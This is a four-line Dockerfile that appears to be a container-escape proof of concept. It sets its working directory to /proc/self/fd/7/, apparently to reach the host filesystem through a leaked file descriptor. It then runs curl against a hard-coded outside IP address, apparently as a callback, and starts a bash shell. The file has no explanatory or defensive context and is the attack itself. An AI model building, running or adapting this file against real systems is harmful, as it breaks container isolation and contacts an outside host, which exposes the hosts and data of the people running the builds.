FROM ubuntu

WORKDIR /proc/self/fd/7/

RUN curl http://68.183.4.199/from_ibm
CMD ["/bin/bash"]
